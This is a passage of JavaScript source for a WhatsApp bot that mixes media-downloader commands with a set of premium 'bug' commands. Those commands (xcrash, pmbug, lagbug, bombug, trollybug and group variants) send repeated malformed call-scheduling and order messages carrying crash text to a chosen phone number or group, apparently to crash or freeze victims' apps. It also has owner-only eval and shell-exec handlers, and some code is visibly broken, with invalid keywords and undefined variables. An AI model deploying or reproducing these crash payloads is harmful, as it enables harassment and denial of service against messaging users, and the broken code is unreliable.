if (!isPremium) return reply(mess.prem)
 if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
 victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "100"
for (let i = 0; i < amount; i++) {
UDMODZcrash(pushname,victim)
await sleep(3000)
}
reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
case 'xcrash2':
if (!isPremium) return reply(mess.prem)
if (!args[0]) return reply(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
 amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
UDMODZcrash(pushname,m.chat)
await sleep(3000)
}
reply(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
break
case 'pmbug' :{
 if (!isPremium) return reply(mess.premium)
 if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 94718461889`)
 await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const UDMODZbug1 = `${udmodztext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Colombo").format("DD/MM/YYYY HH:mm:ss")}`,
"title": UDMODZbug1,
}
}), { userJid: from, quoted : m})
udmodz.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'delaybug' : {
if (!isPremium) return reply(mess.premium)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 94718461889`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const UDMODZbug1 = udmodztext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Colombo").format("DD/MM/YYYY HH:mm:ss")}`,
"title": UDMODZbug1,
}
}), { userJid: from, quoted : m})
udmodz.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
reply(`*Successfully Sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'docubug': {
if (!isPremium) return reply(mess.premium)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 94718461889`)
await loading()
if (args.length < 1) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 94718461889`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
const UDMODZbug1 = `${udmodztext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Colombo").format("DD/MM/YYYY HH:mm:ss")}`,
"title": UDMODZbug1,
}
}), { userJid: from, quoted : m})
udmodz.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'unlimitedbug' : {
if (!isPremium) return reply(mess.premium)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 94718461889`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const UDMODZbug1 = udmodztext3
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Colombo").format("DD/MM/YYYY HH:mm:ss")}`,
"title": UDMODZbug1,
}
}), { userJid: from, quoted : m})
udmodz.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'bombug': {
if (!isPremium) return reply(mess.premium)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 94718461889`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const UDMODZbug1 = udmodztext4
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Colombo").format("DD/MM/YYYY HH:mm:ss")}`,
"title": UDMODZbug1,
}
}), { userJid: from, quoted : m})
udmodz.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'lagbug' : {
if (!isPremium) return reply(mess.premium)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 94718461889`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const UDMODZbug1 = udmodztext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Colombo").format("DD/MM/YYYY HH:mm:ss")}`,
"title": UDMODZbug1,
}
}), { userJid: from, quoted : m})
udmodz.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'trollybug': {
if (!isPremium) return reply(mess.premium)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 94718461889`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": thumb,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " TROLLY BUG ", 
"sellerJid": "94718461889@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
udmodz.relayMessage(victim, order.message, { messageId: order.key.id })
}
reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
case 'gcbug' : {
if (!isPremium) return reply(mess.premium)
 if (!args[0]) return reply(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let UDMODZgroup = await udmodz.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const UDMODZbug1 = `${udmodztext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Colombo").format("DD/MM/YYYY HH:mm:ss")}`,
"title": UDMODZbug1,
}
}), { userJid: from, quoted : m})
udmodz.relayMessage(UDMODZgroup, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
reply(`*Successfully sent Bug To ${UDMODZgroup} Please pause for 3 minutes*`)
}
break
case 'delaygcbug' :  {
if (!isPremium) return reply(mess.premium)
if (!args[0]) return reply(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let UDMODZgroup = await udmodz.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const UDMODZbug1 = udmodztext5
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Colombo").format("DD/MM/YYYY HH:mm:ss")}`,
"title": UDMODZbug1,
}
}), { userJid: from, quoted : m})
udmodz.relayMessage(UDMODZgroup, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
reply(`*Successfully sent Bug To ${UDMODZgroup} Please pause for 3 minutes*`)
}
break
case 'laggcbug' :  {
if (!isPremium) return reply(mess.premium)
if (!args[0]) return reply(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let UDMODZgroup = await udmodz.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const UDMODZbug1 = udmodztext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Colombo").format("DD/MM/YYYY HH:mm:ss")}`,
"title": UDMODZbug1,
}
}), { userJid: from, quoted : m})
udmodz.relayMessage(UDMODZgroup, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
reply(`*Successfully sent Bug To ${UDMODZgroup} Please pause for 3 minutes*`)
}
break
case 'bomgcbug' :  {
if (!isPremium) return reply(mess.premium)
if (!args[0]) return reply(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let UDMODZgroup = await haikal.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const UDMODZbug1 = udmodztext4
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Colombo").format("DD/MM/YYYY HH:mm:ss")}`,
"title": UDMODZbug1,
}
}), { userJid: from, quoted : m})
udmodz.relayMessage(UDMODZgroup, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
reply(`*Successfully sent Bug To ${UDMODZgroup} Please pause for 3 minutes*`)
}
break
case 'unlimitedgcbug' :  {
if (!isPremium) return reply(mess.premium)
if (!args[0]) return reply(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let UDMODZgroup = await udmodz.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const UDMODZbug1 = udmodztext3
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Colombo").format("DD/MM/YYYY HH:mm:ss")}`,
"title": UDMODZbug1,
}
}), { userJid: from, quoted : m})
udmodz.relayMessage(UDMODZgroup, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
reply(`*Successfully sent Bug To ${UDMODZgroup} Please pause for 3 minutes*`)
}
break
case 'trollygcbug' :  {
if (!isPremium) return reply(mess.premium)
if (!args[0]) return reply(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let UDMODZgroup = await udmodz.groupAcceptInvite(result)
amount = "15"
for (let i = 0; i < amount; i++) {
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": thumb,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " TROLLY BUG ", 
"sellerJid": "94718461889@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
udmodz.relayMessage(UDMODZgroup, order.message, { messageId: order.key.id })
}
reply(`*Successfully sent Bug To ${UDMODZgroup} Please pause for 3 minutes*`)
}
break
case 'docugcbug' :  {
if (!isPremium) return reply(mess.premium)
if (!args[0]) return reply(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let UDMODZgroup = await udmodz.groupAcceptInvite(result)
amount = "15"
for (let i = 0; i < amount; i++) {
const UDMODZbug1 = `${udmodztext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Colombo").format("DD/MM/YYYY HH:mm:ss")}`,
"title": UDMODZbug1,
}
}), { userJid: from, quoted : m})
udmodz.relayMessage(UDMODZgroup, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
reply(`*Successfully sent Bug To ${UDMODZgroup} Please pause for 3 minutes*`)
} 
break


//------- SS WEB ----------
//Credit By Dark Shadow Modz
// https://whatsapp.com/channel/0029VaXRYlrKwqSMF7Tswi38

//------ SS WEB --------

case 'ss':
case 'ssweb':{
if (!text) return reply(`no Link`)
try {
udmodz.sendMessage(m.chat, { image: { url: `https://skizo.tech/api/ssweb?type=mobile&url=${encodeURIComponent(text)}&apikey=nanogembul` }}, { quoted: m})
			} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
}
break

// Done 


//------- ANIME ----------
//Credit By Dark Shadow Modz
// https://whatsapp.com/channel/0029VaXRYlrKwqSMF7Tswi38

//------ ANIME --------

case 'anime': {
if (!text) return reply(`Anime Apa Yang Anda Cari?`)
mrsupunfernando malScraper = require('mal-scraper')
reply(mess.wait)
        mrsupunfernando anime = await malScraper.getInfoFromName(text).catch(() => null)
        if (!anime) return reply(`Could not find`)
let animetxt = `
🎀 *Title: ${anime.title}*
🎋 *Type: ${anime.type}*
🎐 *Premiered on: ${anime.premiered}*
💠 *Total Episodes: ${anime.episodes}*
📈 *Status: ${anime.status}*
💮 *Genres: ${anime.genres}
📍 *Studio: ${anime.studios}*
🌟 *Score: ${anime.score}*
💎 *Rating: ${anime.rating}*
🏅 *Rank: ${anime.ranked}*
💫 *Popularity: ${anime.popularity}*
♦️ *Trailer: ${anime.trailer}*
🌐 *URL: ${anime.url}*
❄ *Description:* ${anime.synopsis}*`
await udmodz.sendMessage(m.chat,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
}
break

// fixed

//------- REACTION ----------
//Credit By Dark Shadow Modz
// https://whatsapp.com/channel/0029VaXRYlrKwqSMF7Tswi38

//------ REACTION --------

case 'hi': case 'bye': case 'jir': case 'bjir': case 'gn': case 'apaan': case 'kocak': case 'haha': case 'xixi': case 'bejir': case 'njir': case 'mn': case 'loh': case 'halah': case 'heleh': case 'gm': case 'huluh': case 'welcome': case 'ngeri': case 'sayang': case 'mk': case 'syng': case 'amat': case 'dih': case 'hadeh': case 'haduh': case 'aduh': case 'waduh': case 'wadoh': case 'love': {
let reak = ['🗿', '😁', '🤓', '😴', '😯', '😆', '😂', '🤣', '😋', '😊', '😏', '😇', '🤫', '😪', '🤩', '😱', '😨', '🧐', '😜', '🤪', '😄', '😎', '🤑', '🤥', '🤠', '😬', '🤔', '🤕', '😈', '👿', '😅', '🤤', '🤖', '🌚', '🌝', '💀', '🙈', '🙉', '🙊', '😸', '🗣️', '👤', '👥', '😲']
let reakk = reak[Math.floor(Math.random() * reak.length)]
udmodz.sendMessage(m.chat, { react: {text: reakk, key: m.key}})
}
break

// fixed

//------- Film ----------
//Credit By Dark Shadow Modz
// https://whatsapp.com/channel/0029VaXRYlrKwqSMF7Tswi38

//------ Film --------

case 'film':
    if (!text) return reply('Silakan masukkan nomor halaman (1-2239).');
    
    const page = parseInt(text);
    if (isNaN(page) || page < 1 || page > 2239) {
        return reply('Halaman harus antara 1 dan 2239.');
    }
    
    try {
        const response = await fetch(`https://endpoint.web.id/search/film?key=${global.key}&page=${page}`);
        const data = await response.json();

        if (data.status) {
            const films = data.result;
            const randomIndex = Math.floor(Math.random() * films.length);
            const selectedFilm = films[randomIndex];

            const caption = `*Title:* ${selectedFilm.title}\n` +
                            `*Rating:* ${selectedFilm.rating}\n` +
                            `*Quality:* ${selectedFilm.quality}\n` +
                            `*Type:* ${selectedFilm.type}\n` +
                            `*Link:* [Tonton di sini](${selectedFilm.link})`;

            udmodz.sendMessage(m.chat, { image: { url: selectedFilm.poster }, caption: caption }, { quoted: m });
        } else {
            reply('Tidak ada hasil ditemukan.');
        }
    } catch (error) {
        console.error(error);
        reply('Terjadi kesalahan saat mengambil data. Silakan coba lagi nanti.');
    }
break
// fixed

//------- TEXT2IMG ----------
//Credit By Dark Shadow Modz
// https://whatsapp.com/channel/0029VaXRYlrKwqSMF7Tswi38

//------ TEXT2IMG --------

case 'text2img': {
    if (!text) {
        return reply(`Penggunan salah!!\n\nContoh ${prefix + command} beautiful girl.`);
    }
    let gambar = await fetch(`https://aemt.uk.to/v1/text2img?text=${q}`);
    udmodz.sendMessage(m.chat, { image: gambar }, { quoted: m });
}
break
// fixed


//------ INSTAGRAM DL --------

//Credit By Dark Shadow Modz
// https://whatsapp.com/channel/0029VaXRYlrKwqSMF7Tswi38

//------ INSTAGRAM DL --------

case 'instagram': {
    if (!text) return reply(`> .${command} url`);
    try {
        let insta = await (await fetch(`https://endpoint.web.id/downloader/instagram?key=${global.key}&url=${text}`)).json();
        if (!insta.status || insta.code !== 200) {
            return reply('Gagal mengambil data dari Instagram. Silakan coba lagi.');
        }
        let shannz = insta.result;
        function formatComments(comments) {
            return comments.map(comment => 
                `👤 *User:* ${comment.username}\n💬 *Komentar:* ${comment.text}\n`
            ).join('\n');
        }
        let caption = `📢 *Highlights:* ${supunfernando.caption}\n` +
                      `📆 *Upload:* ${supunfernando.uploadDate}\n` +
                      `👍 *Likes:* ${supunfernando.likes}\n` +
                      `🔗 *Total Comment:* ${supunfernando.commentsCount}\n\n` +
                      `📬 *Comment Teratas:*\n\n` + formatComments(supunfernando.comments);
        if (supunfernando.videos && supunfernando.videos.length > 0) {
            let videoUrl = supunfernando.videos[0]; 
            udmodz.sendMessage(m.chat, { video: { url: videoUrl }, caption: caption }, { quoted: m });
        } else {
            if (supunfernando.images && supunfernando.images.length > 0) {
                let firstImageCaption = caption;
                udmodz.sendMessage(m.chat, { image: { url: supunfernando.images[0] }, caption: firstImageCaption }, { quoted: m });
                for (let i = 1; i < supunfernando.images.length; i++) {
                    udmodz.sendMessage(m.chat, { image: { url: supunfernando.images[i] }, caption: '' }, { quoted: m });
                }
            } else {
                reply('Tidak ada video atau gambar yang ditemukan.');
            }
        }
    } catch (err) {
        reply('Masukkan query lainnya atau coba lagi nanti');
    }
}
break



//------ YT SONG DL --------

//Credit By Dark Shadow Modz
// https://whatsapp.com/channel/0029VaXRYlrKwqSMF7Tswi38

//------ YT SONG DL --------

case 'ytmp3': {
  if (!text) return reply(`*Enter Your Url*`)
  try {
    let load = await (await fetch(`https://endpoint.web.id/downloader/ytmp3?key=${global.key}&url=${text}`)).json();
    let shannz = load.result
 
    await udmodz.sendMessage(m.chat, { audio: { url: supunfernando.media }, mimetype: 'audio/mp4', 
    contextInfo: {
      externalAdReply: {
        title: supunfernando.title,
        body: `Type : Mp3 (128kbps)`,
        thumbnailUrl: supunfernando.image,
        mediaType: 1,
        showAdAttribution: false,
        renderLargerThumbnail: true,
      },
    }, 
    }, { quoted: m });
  } catch (error) {
      reply(`shannz api sedang error, segera repot ke owner!`);
    }
}
break


//------ YT VIDEO DL --------

//Credit By Dark Shadow Modz
// https://whatsapp.com/channel/0029VaXRYlrKwqSMF7Tswi38

//------ YT VIDEO DL --------

case 'ytmp4': {
  if (!text) return reply('*Enter Your Url*')
  try {
    reply('*Process sending video, mungkin membutuhkan 1-3 menit jika durasi video panjang!*')
    let proces = await (await fetch(`https://endpoint.web.id/downloader/ytmp4?key=${global.key}&url=${text}`)).json()
    let video4 = proces.result; 
    udmodz.sendMessage(m.chat,{video:{url: video4.media }, caption: video4.title }, { quoted: m })
  } catch (e) {
      reply('*error*');
    }
}
break


//------ APK MOD --------

//Credit By Dark Shadow Modz
// https://whatsapp.com/channel/0029VaXRYlrKwqSMF7Tswi38

//------ APK MOD --------

case 'an1':
case 'mod':
case 'apkmod':
case 'android1': {
if (!text) return reply('cari mod game apa?')
await loading()
try {
// WM YUDZ 
  const url1 = await android1.search(text);
  const url2 = url1[0].link;
  const url3 = await android1.detail(url2);
  const url4 = url3.downloadUrl;
  const url5 = await android1.download(url4);
  const selesai = url5.downloadUrl;
 //WM YUDZ udmodz.sendMessage(m.chat,
 { document:
 {
 url: selesai
 }, fileName: url5.title, mimetype: 'application/xapk', contextInfo: {
 externalAdReply: {
 title: url1[0].name,
 body: `${global.botname}`,
 thumbnailUrl: url5.imageUrl,
 mediaType: 1,
 showAdAttribution: true,
 renderLargerThumbnail: false,
 },
//WM YUDZ
 }, 
 }, { quoted: m });
} catch (error) {
  return reply(mess.error)
}
}
break


//------ TIK TOK DL --------

//Credit By Dark Shadow Modz
// https://whatsapp.com/channel/0029VaXRYlrKwqSMF7Tswi38

//------ TIK TOK DL --------

‎case  'tiktok': case 'ttnowm': case 'tiktoknowm':  { 
if(!isUrl) return reply(`Masukan link tiktok dengan benar\nContoh: ${prefix}tiktok https://vm.tiktok.com/ZSRfArwXH/`)
if (args.length < 1) return reply(`Link?\nContoh: ${prefix}tiktok https://vm.tiktok.com/ZSRfArwXH/`)
//reply (mess.wait) 
let data = await fetchJson (`https://api.maulanaa.xyz/tools/downloaders/tiktok?apikey=YOUR_KEY&url=${q}`)

let lanPi= `*------------ TIKTOK DL ]-----------*

*Title*: ${data.data.title}
*Durasi*: ${data.data.duration}
*Download*: ${data.data.download}
*Share*: ${data.data.share}
*View*: ${data.data.view}
*Play*: ${data.data.play}
*Music*: ${data.data.audio}
` 
udmodz.sendMessage(from, {video: {url: data.data.play}, caption: lanPi}, {quoted: m})

await udmodz.sendMessage(from, { audio: {url: data.data.audio}, mimetype: 'audio/mp4'}, { quoted: m}) 
await sleep(2000)
} 
break


//------ MEDIAFIRE DL --------

//Credit By Dark Shadow Modz
// https://whatsapp.com/channel/0029VaXRYlrKwqSMF7Tswi38

//------ MEDIAFIRE DL --------

case 'mediafire': {
  if (!isPrem && global.db.data.users[sender].limit < 1) 
        return reply('Maaf Kak, Limit Anda Habis. Ingin Membeli Limit? Ketik .buylimit');
    
    db.data.users[sender].limit -= 1;
    if (!args[0]) return reply(`Masukkan link Mediafire setelah perintah\ncontoh ${command} https://www.mediafire.com/file/xxxxxx`);
    if (!args[0].match(/mediafire/gi)) return reply(`Link tidak benar`);

    const axios = require('axios');

    try {
        const url = args[0];
        const apiURL = `https://api.zenkey.my.id/api/download/mediafire?url=${url}&apikey=zenkey`;

        const { data } = await axios.get(apiURL);

        if (!data || data.status !== true) {
            return reply(`Gagal mengambil data. Coba lagi nanti.`);
        }

        const { filename, size, uploaded, extension, mime, link: downloadUrl } = data.result;

        const caption = `
        ≡ *MEDIAFIRE DOWNLOAD*

▢ *Nama File:* ${filename}
▢ *Ukuran:* ${size}
▢ *Ekstensi:* ${extension}
▢ *Diunggah:* ${uploaded}
`.trim();

        udmodz.sendMessage(
            m.chat, 
            { document: { url: downloadUrl }, fileName: filename, mimetype: mime, caption: caption }, 
            { quoted: m }
        );

    } catch (error) {
        console.error(error);
        reply(`Terjadi kesalahan saat mengunduh file. Coba lagi nanti.`);
    }
}
break;


case 'owner': {
	await udmodz.sendMessage(m.chat, {
		react: {
			text: "",
			key: m.key,
		}
	})
	let img = "http://telegra.ph/file/9a332c815ad31956d5ce6.jpg"
	async function image(url) {
		const {
			imageMessage
		} = await generateWAMessageContent({
			image: {
				url
			}
		}, {
			upload: udmodz.waUploadToServer
		})
		return imageMessage
	}
	let msg = generateWAMessageFromContent(
		m.chat, {
			viewOnceMessage: {
				message: {
					interactiveMessage: {
						body: {
							text: (`𝐔𝐃𝐌𝐎𝐃𝐙`)
						},
						carouselMessage: {
							cards: [{
								header: {
									imageMessage: await image(img),
									hasMediaAttachment: true,
								},
								body: {
									text: `*𝐔𝐃𝐇𝐀𝐍𝐈𝐊𝐀*`
								},
								nativeFlowMessage: {
									buttons: [{
										name: "cta_url",
										buttonParamsJson: '{"display_text":"👤 Owner","url":"https:\\/\\/wa.me\\/94704638406","webview_presentation":null}',
									}, ],
								},
							}, {
								header: {
									imageMessage: await image(img),
									hasMediaAttachment: true,
								},
								body: {
									text: `*𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐂𝐇𝐀𝐍𝐍𝐄𝐋*`
								},
								nativeFlowMessage: {
									buttons: [{
										name: "cta_url",
										buttonParamsJson: '{"display_text":"🌐 Channel","url":"https://whatsapp.com/channel/0029Va5e01M3LdQdtjYJjc3K","merchant_url":"https://www.google.com"}',
									}, ],
								},
							}, ],
							messageVersion: 1,
						},
					},
				},
			},
		}, {});
	await udmodz.relayMessage(msg.key.remoteJid, msg.message, {
		messageId: msg.key.id,
	});
}
break

default:
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!isCreator) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await reply(require('util').format(teks))
}
}

if (budy.startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) return reply(stdout)
})
}
}

} catch (err) {
console.log(util.format(err))
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})
